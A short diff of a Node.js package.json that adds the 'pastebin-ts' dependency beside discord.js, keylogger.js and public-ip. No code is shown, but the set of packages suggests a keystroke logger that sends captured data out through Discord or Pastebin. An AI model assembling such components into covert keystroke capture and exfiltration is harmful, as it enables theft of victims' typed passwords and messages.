@@ -11,6 +11,7 @@
   "dependencies": {
     "discord.js": "^13.6.0",
     "keylogger.js": "^0.0.4",
+    "pastebin-ts": "^1.2.0",
     "public-ip": "^5.0.0"
   }
 }
